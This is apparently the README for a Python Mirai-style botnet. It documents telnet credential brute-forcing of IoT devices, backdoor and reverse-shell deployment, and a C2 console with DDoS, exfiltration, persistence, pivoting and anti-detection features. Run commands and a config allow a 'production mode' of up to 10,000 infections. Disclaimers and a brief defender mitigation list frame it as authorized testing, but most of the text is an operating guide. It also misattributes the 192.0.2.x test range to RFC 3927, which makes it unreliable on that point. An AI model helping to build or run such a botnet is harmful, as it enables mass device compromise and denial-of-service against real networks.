# PyRai Weaponized Botnet - Documentation

**ETHICAL DISCLAIMER: This tool is for authorized testing only. Misuse is prohibited.**

## Overview

The PyRai Weaponized Scanner has been enhanced with advanced backdoor capabilities, transforming it from a simple credential harvester into a full-featured botnet for authorized penetration testing and red team exercises.

## Architecture

### Core Components

1. **scanner.py** - Weaponized scanner with backdoor deployment
2. **c2_server.py** - Command and Control server
3. **test_bot.py** - Test bot for simulation
4. **relay.py** - Credential relay server
5. **loader.py** - Payload deployment system

### New Features

- **Reverse Shell Capabilities**: Establish persistent backdoor access
- **Botnet Command & Control**: Centralized management of infected machines
- **DDoS Attack Coordination**: Distributed denial of service capabilities
- **File Transfer**: Upload/download files to/from bots
- **Persistence Mechanisms**: Maintain access across reboots
- **Self-Destruct**: Automatic cleanup after 90 days

## Safety Mechanisms

### Testing Safeguards
- **TESTING_MODE**: Limits functionality for safe testing
- **MAX_INFECTIONS**: Caps number of infected machines (10 in testing mode)
- **MAX_SCAN_TARGETS**: Limits scanning scope (100 in testing mode)
- **SCAN_DELAY**: Rate limiting to prevent network flooding
- **Self-Destruct**: Automatic payload removal after 90 days

### IP Range Filtering
- Testing mode uses RFC 3927 test ranges (192.0.2.x)
- Production mode filters out reserved/private ranges
- Configurable target networks for authorized testing

## Usage Guide

### 1. Setting Up the C2 Infrastructure

#### Start the C2 Server
```bash
python3 c2_server.py
```

The C2 server provides:
- Bot management on port 31340
- Reverse shell listener on port 31341
- Interactive command console

#### C2 Commands
- `status` - Show botnet status
- `bots` - List connected bots
- `ddos <ip> <port> <duration>` - Launch DDoS attack
- `shell <bot_id>` - Get reverse shell from bot
- `cmd <command>` - Send command to all bots
- `quit` - Shutdown C2 server

### 2. Starting the Relay Server

```bash
python3 relay.py
```

The relay server:
- Collects credentials from scanners
- Stores results in `dump/csdb.txt`
- Provides centralized credential management

### 3. Deploying the Weaponized Scanner

```bash
python3 scanner.py
```

The scanner will:
- Scan for vulnerable telnet services
- Brute force authentication
- Deploy backdoor payloads
- Establish C2 connections

### 4. Testing with Simulated Bots

```bash
python3 test_bot.py
```

Test bots simulate infected machines for safe testing.

## Backdoor Payloads

### Simple Backdoor
- Binds to port 31339
- Basic authentication
- Command execution
- Suitable for testing environments

### Advanced Reverse Shell
- Connects to C2 server
- File transfer capabilities
- DDoS attack functions
- Persistence mechanisms
- Self-update capability

## Network Ports

| Port  | Service | Description |
|-------|---------|-------------|
| 31337 | Relay | Credential collection |
| 31338 | HTTP | Payload serving |
| 31339 | Backdoor | Simple backdoor access |
| 31340 | C2 | Command and control |
| 31341 | Shell | Reverse shell connections |

## Configuration

### Scanner Configuration
```python
# Testing limits
MAX_SCAN_TARGETS = 100 if TESTING_MODE else 1000000
MAX_INFECTIONS = 10 if TESTING_MODE else 10000
SCAN_DELAY = 2 if TESTING_MODE else 0.1

# C2 Configuration
C2_SERVER = "127.0.0.1"  # Change for your lab
C2_PORT = 31340
REVERSE_SHELL_PORT = 31341
BACKDOOR_PORT = 31339
```

### Credential Database
Default IoT credentials are stored in `MAlist` array:
- Common factory defaults
- Weak passwords
- Default accounts

## Attack Capabilities

### 1. Credential Harvesting
- Brute force telnet authentication
- Store valid credentials
- Target IoT devices and embedded systems

### 2. Backdoor Deployment
- Upload Python payloads via telnet
- Execute backdoors in background
- Establish persistent access

### 3. Botnet Operations
- Centralized command and control
- Real-time bot management
- Coordinated attack execution

### 4. DDoS Attacks
- Distributed denial of service
- Configurable targets and duration
- Multi-threaded attack vectors

### 5. Data Exfiltration
- File download from bots
- Credential collection
- System information gathering

## Lab Environment Setup

### Recommended Lab Configuration

1. **Isolated Network**: Use air-gapped or VLAN-isolated environment
2. **Vulnerable Targets**: Deploy IoT devices or honeypots with default credentials
3. **Monitoring**: Set up network monitoring and logging
4. **Documentation**: Record all activities for analysis

### Target Systems
- IoT devices with telnet enabled
- Embedded systems with default credentials
- Honeypots configured for testing
- Virtual machines simulating vulnerable hosts

## Legal and Ethical Considerations

### Authorization Requirements
- Written authorization from network owners
- Defined scope and limitations
- Clear rules of engagement
- Incident response procedures

### Safety Confirmations
Each component requires explicit authorization:
```
Type 'AUTHORIZED' to continue:
```

### Logging and Monitoring
- All activities are logged
- Timestamps and source tracking
- Audit trail for compliance
- Evidence collection for reporting

## Mitigation Recommendations

### For Defenders
1. **Change Default Credentials**: Replace factory defaults immediately
2. **Disable Telnet**: Use SSH instead of telnet
3. **Network Segmentation**: Isolate IoT devices
4. **Monitoring**: Deploy network intrusion detection
5. **Firmware Updates**: Keep devices updated

### For Penetration Testers
1. **Scope Limitation**: Stay within authorized boundaries
2. **Data Protection**: Secure collected credentials
3. **Clean-up**: Remove payloads after testing
4. **Documentation**: Maintain detailed records
5. **Responsible Disclosure**: Report vulnerabilities properly

## Troubleshooting

### Common Issues

#### Scanner Not Finding Targets
- Check IP range configuration
- Verify network connectivity
- Ensure targets have telnet enabled

#### C2 Connection Failures
- Verify C2 server is running
- Check firewall settings
- Confirm port availability

#### Payload Deployment Issues
- Check telnet session stability
- Verify Python availability on targets
- Review payload syntax

### Debug Mode
Enable verbose logging:
```python
logging.basicConfig(level=logging.DEBUG)
```

## Advanced Features

### Custom Payloads
Modify `BackdoorPayload` class to create custom backdoors:
- Add new attack vectors
- Implement custom protocols
- Enhance persistence mechanisms

### Network Pivoting
Use compromised hosts as pivot points:
- Route traffic through bots
- Access internal networks
- Lateral movement capabilities

### Stealth Techniques
- Traffic obfuscation
- Anti-detection measures
- Covert channels

## Conclusion

The PyRai Weaponized Botnet provides a comprehensive platform for authorized penetration testing and red team exercises. Its modular design allows for customization while maintaining safety mechanisms for responsible testing.

Remember: This tool is designed for authorized security testing only. Always ensure proper authorization and follow ethical guidelines when conducting penetration tests.

---

**Final Warning**: Unauthorized use of this tool is illegal and unethical. Only use in authorized lab environments with proper permissions. 